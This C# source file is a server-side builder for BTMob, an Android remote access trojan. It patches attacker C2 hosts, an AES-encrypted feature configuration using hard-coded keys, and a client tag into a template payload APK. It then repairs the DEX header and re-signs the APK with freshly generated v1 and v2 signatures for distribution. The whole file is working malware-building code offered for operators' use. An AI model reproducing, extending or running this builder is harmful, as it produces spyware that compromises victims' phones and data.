// ServerApkBuilder.cs — server-side payload builder, a .NET 8 port of the
// panel's LocalApkBuilder (BtMob/BTMOB/LocalApkBuilder.cs).
//
// The original vendor flow (reconstructed): ApkMaker posted the full build
// parameter dictionary to yarsap_36921.php (MyServer.CommandStore,
// subcom="build"); the PHP server patched its template APK and returned
// {"Success":"<path or url>"}; the panel then listed the payload in the
// store grid (app_id/app_name/.../appstate rows) and operators downloaded
// it from http://<server>/yaarsa/user/storage/<...>.
//
// This port performs the exact same local patch+sign job on the server:
//   1. C2 endpoints  -> base64("connkey[<s>]host1<host2[<s>]T") + "|" over
//        yearly.quicksilver.master.nmzgrbqkgkgldgzyfb.vluguosseqy
//   2. Feature flags -> AES-128-CBC(PBKDF2WithHmacSHA1) of allconf over
//        yearly.quicksilver.master.nmzgrbqkgkgldgzyfb.uqikqxtclgzaomlr
//   3. Client tag     -> "oltsfhxzoffaynqemztews" + tag over
//        yearly.quicksilver.master.r0.k tag literal
// then re-signs (v1 JAR + v2 APK Signing Block) with BouncyCastle 2.x.

using System.Collections.Generic;
using System.IO.Compression;
using System.Security.Cryptography;
using System.Text;
using Org.BouncyCastle.Crypto;
using Org.BouncyCastle.Crypto.Generators;
using Org.BouncyCastle.Crypto.Operators;
using Org.BouncyCastle.Math;
using Org.BouncyCastle.Pkcs;
using Org.BouncyCastle.Security;
using Org.BouncyCastle.X509;
using Org.BouncyCastle.Cms;
using Org.BouncyCastle.Asn1.X509;

namespace BtServer;

public static class ServerApkBuilder
{
    // ---- literals inside the template DEX (verified against test.apk) ----
    private const string TemplateC2Config =
        "aXphM2FbPHM+XXd3dy5nb29nbGUuY29tWzxzPl1pbnNlY3Qua2luZ2RvbS5icm90aGVyWzxzPl1U";

    private const string TemplateSettingsBlob =
        "icx8uKXkEFGBYIfzT+f+9xWcLnPAGy2Jgckes32fR7DPYhgiFI/Dp4fhoUUHUz7y6BRId4L/D05sOhCBYgg+ErX90lf7bgD9sfYchg1hWddlaGY84E47J7rChnPVBl2dm6GW+hcAErhm9brPvd5AzE3JKvAodIfe8N2JrcLNo5Q=";

    private const string TemplateTagPrefix = "oltsfhxzoffaynqemztews";

    // AES material baked into every BTMob payload (class cc constants).
    private const string SettingsPassword = "4814780584699673";
    private const string SettingsSalt = "2894356330652558";
    private const string SettingsIv = "2230209522049090";

    /// <summary>
    /// Build a payload from the template. <paramref name="p"/> carries the
    /// same keys the panel posted (conkey, uhost, Ctag, allconf, appname,
    /// appversion, appid, build, ksign). Returns the produced APK path.
    /// </summary>
    public static string Build(Dictionary<string, string> p, string templateApkPath, string outputDirectory)
    {
        string connectionKey = Get(p, "conkey", RandomToken(16));
        string hostList = Get(p, "uhost", "127.0.0.1:8080");
        string clientTag = Get(p, "Ctag", "default");
        string allconf = Get(p, "allconf",
            "0|0[*]1|1[*]1|1[*]1|1[*]0|0[*]0|0[*]1|1[*]1|1[*]1|1[*]1|1[*]0|0[*]1|1[*]0|0[*]0|0[*]0|0[*]0|0|0|0[*]0|0[*]0|0[*]0|0[*]1|1");
        string appId = Get(p, "appid", "com.example.app");
        string buildName = Get(p, "build", "built");

        // ---- compute the three replacement literals ----
        string c2Plain = connectionKey + "[<s>]" + hostList + "[<s>]T";
        string c2Literal = Convert.ToBase64String(Encoding.UTF8.GetBytes(c2Plain)) + "|";
        string settingsLiteral = EncryptSettings(allconf);
        string tagLiteral = TemplateTagPrefix + clientTag;

        // ---- read template DEX and patch in place ----
        byte[] dex;
        using (ZipArchive zip = ZipFile.OpenRead(templateApkPath))
        {
            ZipArchiveEntry dexEntry = zip.Entries.FirstOrDefault(e => e.FullName == "classes.dex")
                ?? throw new InvalidOperationException("template APK has no classes.dex");
            using var ms = new MemoryStream();
            dexEntry.Open().CopyTo(ms);
            dex = ms.ToArray();
        }

        ReplaceLiteral(dex, TemplateC2Config, c2Literal, "C2 config");
        ReplaceLiteral(dex, TemplateSettingsBlob, settingsLiteral, "settings blob");
        ReplaceLiteral(dex, TemplateTagPrefix + "test", tagLiteral, "client tag");

        FixDexHeader(dex);

        // ---- repackage ----
        DirectoryInfo outDir = Directory.CreateDirectory(outputDirectory);
        string outApk = Path.Combine(outDir.FullName, SanitizeFileName($"{buildName}_{clientTag}_{appId}.apk"));
        if (File.Exists(outApk)) File.Delete(outApk);

        using (ZipArchive src = ZipFile.OpenRead(templateApkPath))
        using (ZipArchive dst = ZipFile.Open(outApk, ZipArchiveMode.Create))
        {
            foreach (ZipArchiveEntry entry in src.Entries)
            {
                if (IsSignatureFile(entry.FullName)) continue;
                ZipArchiveEntry newEntry = dst.CreateEntry(entry.FullName, CompressionLevel.Optimal);
                using Stream os = newEntry.Open();
                if (entry.FullName == "classes.dex")
                    os.Write(dex, 0, dex.Length);
                else
                    entry.Open().CopyTo(os);
            }
        }

        // ---- sign (v1 + v2, one shared identity) ----
        SigningIdentity id = CreateSigningIdentity(p);
        SignApkJar(outApk, id);
        SignApkV2(outApk, id);

        return outApk;
    }

    // ======================= signing identity =======================

    private sealed class SigningIdentity
    {
        public AsymmetricCipherKeyPair KeyPair;
        public X509Certificate Certificate;
    }

    private static SigningIdentity CreateSigningIdentity(Dictionary<string, string> p)
    {
        string ksign = Get(p, "ksign", "");
        string cn = "BTMob", ou = "OpenRATS", o = "OpenRATS", l = "", s = "", c = "";
        if (!string.IsNullOrEmpty(ksign))
        {
            // Panel format: "use|alias|password|cn|ou|o|l|s|c" (KeystoreEncoder).
            string[] parts = ksign.Split('|');
            if (parts.Length >= 9)
            {
                cn = parts[3]; ou = parts[4]; o = parts[5];
                l = parts[6]; s = parts[7]; c = parts[8];
            }
        }

        var gen = new RsaKeyPairGenerator();
        gen.Init(new KeyGenerationParameters(new SecureRandom(), 2048));
        AsymmetricCipherKeyPair kp = gen.GenerateKeyPair();
        var certGen = new X509V3CertificateGenerator();
        X509Name subject = MakeSubject(cn, ou, o, l, s, c);
        certGen.SetSerialNumber(BigInteger.ValueOf(DateTime.UtcNow.Ticks));
        certGen.SetSubjectDN(subject);
        certGen.SetIssuerDN(subject);
        certGen.SetNotBefore(DateTime.UtcNow.AddDays(-1));
        certGen.SetNotAfter(DateTime.UtcNow.AddYears(30));
        certGen.SetPublicKey(kp.Public);
        X509Certificate cert = certGen.Generate(
            new Asn1SignatureFactory("SHA256WITHRSA", kp.Private, new SecureRandom()));
        return new SigningIdentity { KeyPair = kp, Certificate = cert };
    }

    private static bool IsSignatureFile(string name)
    {
        if (!name.StartsWith("META-INF/", StringComparison.OrdinalIgnoreCase)) return false;
        return name.EndsWith(".RSA", StringComparison.OrdinalIgnoreCase) ||
               name.EndsWith(".SF", StringComparison.OrdinalIgnoreCase) ||
               name.EndsWith(".DSA", StringComparison.OrdinalIgnoreCase) ||
               name.EndsWith(".EC", StringComparison.OrdinalIgnoreCase) ||
               name.Equals("META-INF/MANIFEST.MF", StringComparison.OrdinalIgnoreCase);
    }

    private static string Get(Dictionary<string, string> p, string key, string fallback)
    {
        if (p != null && p.TryGetValue(key, out string v) && !string.IsNullOrEmpty(v)) return v;
        return fallback;
    }

    private static string RandomToken(int length)
    {
        const string chars = "abcdefghijklmnopqrstuvwxyzABCDEFGHIJKLMNOPQRSTUVWXYZ0123456789";
        byte[] buf = RandomNumberGenerator.GetBytes(length);
        var outChars = new char[length];
        for (int i = 0; i < length; i++) outChars[i] = chars[buf[i] % chars.Length];
        return new string(outChars);
    }

    private static string SanitizeFileName(string name)
    {
        foreach (char c in Path.GetInvalidFileNameChars()) name = name.Replace(c, '_');
        return name;
    }

    // ======================= DEX patching =======================

    private static void ReplaceLiteral(byte[] dex, string original, string replacement, string what)
    {
        byte[] needle = Encoding.UTF8.GetBytes(original);
        int at = IndexOf(dex, needle, 0);
        if (at < 0)
            throw new InvalidOperationException("template DEX does not contain the " + what + " literal");
        byte[] rep = Encoding.UTF8.GetBytes(replacement);
        if (rep.Length > needle.Length)
            throw new InvalidOperationException(
                $"{what} literal too long for template slot ({rep.Length} > {needle.Length} bytes)");
        Array.Copy(rep, 0, dex, at, rep.Length);
        for (int i = rep.Length; i < needle.Length; i++) dex[at + i] = 0;
    }

    private static int IndexOf(byte[] hay, byte[] needle, int start)
    {
        for (int i = start; i <= hay.Length - needle.Length; i++)
        {
            int j = 0;
            while (j < needle.Length && hay[i + j] == needle[j]) j++;
            if (j == needle.Length) return i;
        }
        return -1;
    }

    private static void FixDexHeader(byte[] dex)
    {
        using (var sha = SHA1.Create())
        {
            Array.Clear(dex, 12, 20);
            byte[] sig = sha.ComputeHash(dex, 32, dex.Length - 32);
            Array.Copy(sig, 0, dex, 12, 20);
        }
        uint a = 1, b = 0;
        for (int i = 12; i < dex.Length; i++)
        {
            a = (a + dex[i]) % 65521;
            b = (b + a) % 65521;
        }
        uint sum = (b << 16) | a;
        dex[8] = (byte)(sum & 0xFF);
        dex[9] = (byte)((sum >> 8) & 0xFF);
        dex[10] = (byte)((sum >> 16) & 0xFF);
        dex[11] = (byte)((sum >> 24) & 0xFF);
    }

    private static string EncryptSettings(string plain)
    {
        // .NET Rfc2898DeriveBytes(password, salt, iterations) defaults to
        // PBKDF2-HMAC-SHA1 — same as the payload's PBKDF2WithHmacSHA1.
        using var kdf = new Rfc2898DeriveBytes(SettingsPassword, Encoding.UTF8.GetBytes(SettingsSalt), 65536, HashAlgorithmName.SHA1);
        byte[] key = kdf.GetBytes(16);
        using var aes = Aes.Create();
        aes.Mode = CipherMode.CBC;
        aes.Padding = PaddingMode.PKCS7;
        aes.Key = key;
        aes.IV = Encoding.UTF8.GetBytes(SettingsIv);
        using ICryptoTransform enc = aes.CreateEncryptor();
        byte[] plainBytes = Encoding.UTF8.GetBytes(plain);
        byte[] cipher = enc.TransformFinalBlock(plainBytes, 0, plainBytes.Length);
        return Convert.ToBase64String(cipher);
    }

    // ======================= APK Signature Scheme v2 =======================

    private static void SignApkV2(string apkPath, SigningIdentity id)
    {
        byte[] file = File.ReadAllBytes(apkPath);
        int eocdAt = FindEocd(file);
        if (eocdAt < 0) throw new InvalidOperationException("APK has no ZIP EOCD record");
        int cdOffset = ReadInt32(file, eocdAt + 16);
        int cdSize = ReadInt32(file, eocdAt + 12);

        AsymmetricCipherKeyPair kp = id.KeyPair;
        X509Certificate cert = id.Certificate;

        byte[] contents = new byte[cdOffset];
        Array.Copy(file, 0, contents, 0, cdOffset);
        byte[] cd = new byte[cdSize];
        Array.Copy(file, cdOffset, cd, 0, cdSize);
        byte[] eocd = new byte[file.Length - eocdAt];
        Array.Copy(file, eocdAt, eocd, 0, eocd.Length);

        byte[] digest = ChunkedSha256(contents, cd, eocd);
        byte[] digestEntry = Concat(UInt32LE(0x0103), LengthPrefix(digest));
        byte[] digestsSeq = LengthPrefix(LengthPrefix(digestEntry));
        byte[] certificatesSeq = LengthPrefix(LengthPrefix(cert.GetEncoded()));
        byte[] additionalAttributes = UInt32LE(0);
        byte[] signedDataBody = Concat(digestsSeq, certificatesSeq, additionalAttributes);

        byte[] signature;
        {
            ISigner sigMaker = SignerUtilities.GetSigner("SHA256WITHRSA");
            sigMaker.Init(true, kp.Private);
            sigMaker.BlockUpdate(signedDataBody, 0, signedDataBody.Length);
            signature = sigMaker.GenerateSignature();
        }
        byte[] signatureEntry = Concat(UInt32LE(0x0103), LengthPrefix(signature));
        byte[] signaturesSeq = LengthPrefix(signatureEntry);

        byte[] publicKey = SubjectPublicKeyInfoFactory.CreateSubjectPublicKeyInfo(kp.Public).GetEncoded();

        byte[] signer = LengthPrefix(Concat(
            LengthPrefix(signedDataBody),
            LengthPrefix(signaturesSeq),
            LengthPrefix(publicKey)));
        byte[] signers = LengthPrefix(signer);
        byte[] blockV2 = IdValuePair(0x7109871a, signers);

        long pairBytes = blockV2.Length;
        long totalSize = pairBytes + 8 + 16;
        byte[] block = new byte[pairBytes + 8 + 8 + 16];
        int pos = 0;
        WriteInt64(block, ref pos, totalSize);
        Array.Copy(blockV2, 0, block, pos, blockV2.Length); pos += blockV2.Length;
        WriteInt64(block, ref pos, totalSize);
        byte[] magic = Encoding.ASCII.GetBytes("APK Sig Block 42");
        Array.Copy(magic, 0, block, pos, magic.Length);

        int shift = block.Length;
        using var ms = new MemoryStream();
        ms.Write(contents, 0, contents.Length);
        ms.Write(block, 0, block.Length);
        ms.Write(cd, 0, cd.Length);
        byte[] eocdNew = (byte[])eocd.Clone();
        WriteInt32To(eocdNew, 16, cdOffset + shift);
        ms.Write(eocdNew, 0, eocdNew.Length);
        File.WriteAllBytes(apkPath, ms.ToArray());
    }

    private static byte[] ChunkedSha256(params byte[][] sections)
    {
        const int CHUNK = 1048576;
        using var sha = SHA256.Create();
        int totalChunks = 0;
        foreach (byte[] section in sections)
            totalChunks += (section.Length + CHUNK - 1) / CHUNK;

        byte[] output = new byte[5 + totalChunks * 32];
        output[0] = 0x5a;
        Array.Copy(UInt32LE((uint)totalChunks), 0, output, 1, 4);

        int chunkIndex = 0;
        foreach (byte[] section in sections)
        {
            for (int off = 0; off < section.Length; off += CHUNK)
            {
                int len = Math.Min(CHUNK, section.Length - off);
                using var ms = new MemoryStream();
                ms.WriteByte(0xa5);
                ms.Write(UInt32LE((uint)len), 0, 4);
                ms.Write(section, off, len);
                byte[] chunkDigest = sha.ComputeHash(ms.ToArray());
                Array.Copy(chunkDigest, 0, output, 5 + chunkIndex * 32, 32);
                chunkIndex++;
            }
        }
        return sha.ComputeHash(output);
    }

    private static byte[] UInt32LE(uint v)
        => new byte[4] { (byte)(v & 0xFF), (byte)((v >> 8) & 0xFF), (byte)((v >> 16) & 0xFF), (byte)((v >> 24) & 0xFF) };

    private static byte[] LengthPrefix(byte[] data)
    {
        byte[] result = new byte[4 + data.Length];
        WriteInt32To(result, 0, data.Length);
        Array.Copy(data, 0, result, 4, data.Length);
        return result;
    }

    private static byte[] IdValuePair(uint id, byte[] value)
    {
        byte[] pair = new byte[8 + 4 + value.Length];
        int pos = 0;
        WriteInt64(pair, ref pos, 4 + value.Length);
        WriteInt32To(pair, ref pos, (int)id);
        Array.Copy(value, 0, pair, pos, value.Length);
        return pair;
    }

    private static byte[] Concat(params byte[][] arrays)
    {
        int total = 0;
        foreach (byte[] a in arrays) total += a.Length;
        byte[] result = new byte[total];
        int pos = 0;
        foreach (byte[] a in arrays) { Array.Copy(a, 0, result, pos, a.Length); pos += a.Length; }
        return result;
    }

    private static void WriteInt32To(byte[] buf, int offset, int value)
    {
        buf[offset] = (byte)(value & 0xFF);
        buf[offset + 1] = (byte)((value >> 8) & 0xFF);
        buf[offset + 2] = (byte)((value >> 16) & 0xFF);
        buf[offset + 3] = (byte)((value >> 24) & 0xFF);
    }

    private static void WriteInt32To(byte[] buf, ref int pos, int value)
    {
        WriteInt32To(buf, pos, value);
        pos += 4;
    }

    private static void WriteInt64(byte[] buf, ref int pos, long value)
    {
        for (int i = 0; i < 8; i++) buf[pos + i] = (byte)((value >> (8 * i)) & 0xFF);
        pos += 8;
    }

    private static int ReadInt32(byte[] buf, int offset)
        => buf[offset] | (buf[offset + 1] << 8) | (buf[offset + 2] << 16) | (buf[offset + 3] << 24);

    private static int FindEocd(byte[] file)
    {
        for (int i = file.Length - 22; i >= 0; i--)
            if (file[i] == 0x50 && file[i + 1] == 0x4b && file[i + 2] == 0x05 && file[i + 3] == 0x06)
                return i;
        return -1;
    }

    // ======================= v1 JAR signing =======================

    private static void SignApkJar(string apkPath, SigningIdentity id)
    {
        AsymmetricCipherKeyPair kp = id.KeyPair;
        X509Certificate cert = id.Certificate;

        string manifest = "Manifest-Version: 1.0\r\nCreated-By: BT Server OpenRATS\r\n\r\n";
        var mfBody = new StringBuilder();
        var fileDigests = new List<KeyValuePair<string, string>>();

        using (ZipArchive zip = ZipFile.Open(apkPath, ZipArchiveMode.Update))
        {
            List<ZipArchiveEntry> entries = zip.Entries
                .Where(e => !e.FullName.StartsWith("META-INF/", StringComparison.OrdinalIgnoreCase))
                .OrderBy(e => e.FullName, StringComparer.Ordinal)
                .ToList();

            foreach (ZipArchiveEntry entry in entries)
            {
                byte[] data = ReadEntry(entry);
                string digestB64;
                using (var sha = SHA256.Create())
                    digestB64 = Convert.ToBase64String(sha.ComputeHash(data));
                mfBody.Append("Name: ").Append(entry.FullName).Append("\r\n")
                    .Append("SHA-256-Digest: ").Append(digestB64).Append("\r\n\r\n");
                fileDigests.Add(new KeyValuePair<string, string>(entry.FullName, digestB64));
            }

            manifest += mfBody.ToString();
            byte[] manifestBytes = Encoding.UTF8.GetBytes(manifest);
            string manifestDigest;
            using (var sha = SHA256.Create())
                manifestDigest = Convert.ToBase64String(sha.ComputeHash(manifestBytes));

            string mainAttrs = "Manifest-Version: 1.0\r\nCreated-By: BT Server OpenRATS\r\n";
            string mainAttrsDigest;
            using (var sha = SHA256.Create())
                mainAttrsDigest = Convert.ToBase64String(sha.ComputeHash(Encoding.UTF8.GetBytes(mainAttrs + "\r\n")));

            string sf = "Signature-Version: 1.0\r\nCreated-By: BT Server OpenRATS\r\n" +
                        "X-Android-APK-Signed: 2\r\n" +
                        "SHA-256-Digest-Manifest: " + manifestDigest + "\r\n" +
                        "SHA-256-Digest-Manifest-Main-Attributes: " + mainAttrsDigest + "\r\n\r\n";
            foreach (KeyValuePair<string, string> fd in fileDigests)
                sf += "Name: " + fd.Key + "\r\nSHA-256-Digest: " + fd.Value + "\r\n\r\n";

            WriteEntry(zip, "META-INF/MANIFEST.MF", manifestBytes);
            byte[] sfBytes = Encoding.UTF8.GetBytes(sf);
            WriteEntry(zip, "META-INF/KEY.SF", sfBytes);

            var cmsGen = new CmsSignedDataGenerator();
            cmsGen.AddSigner(kp.Private, cert, CmsSignedDataGenerator.DigestSha256);
            cmsGen.AddCertificate(cert);
            CmsSignedData signed = cmsGen.Generate(new CmsProcessableByteArray(sfBytes), encapsulate: false);
            WriteEntry(zip, "META-INF/KEY.RSA", signed.GetEncoded());
        }
    }

    private static X509Name MakeSubject(string cn, string ou, string o, string l, string s, string c)
    {
        var oids = new List<Org.BouncyCastle.Asn1.DerObjectIdentifier>();
        var values = new List<string>();
        AddIf(X509Name.CN, cn, oids, values);
        AddIf(X509Name.OU, ou, oids, values);
        AddIf(X509Name.O, o, oids, values);
        AddIf(X509Name.L, l, oids, values);
        AddIf(X509Name.ST, s, oids, values);
        AddIf(X509Name.C, c, oids, values);
        return new X509Name(oids, values);
    }

    private static void AddIf(Org.BouncyCastle.Asn1.DerObjectIdentifier id, string v,
        List<Org.BouncyCastle.Asn1.DerObjectIdentifier> oids, List<string> values)
    {
        if (!string.IsNullOrEmpty(v)) { oids.Add(id); values.Add(v); }
    }

    private static byte[] ReadEntry(ZipArchiveEntry entry)
    {
        using var ms = new MemoryStream();
        entry.Open().CopyTo(ms);
        return ms.ToArray();
    }

    private static void WriteEntry(ZipArchive zip, string name, byte[] data)
    {
        ZipArchiveEntry e = zip.CreateEntry(name, CompressionLevel.Optimal);
        using Stream s = e.Open();
        s.Write(data, 0, data.Length);
    }
}
